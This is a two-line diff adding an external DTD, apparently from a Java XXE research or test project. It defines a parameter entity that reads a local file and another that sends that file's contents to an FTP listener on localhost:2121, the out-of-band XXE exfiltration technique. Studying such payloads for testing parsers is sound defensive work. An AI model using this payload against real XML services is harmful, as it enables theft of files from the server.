@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///Users/leadroyal/Java_code/java_xxe_2019/multi_line.txt">
+<!ENTITY % define_ftp '<!ENTITY &#37; send_ftp SYSTEM "ftp://localhost:2121/%file;">'>
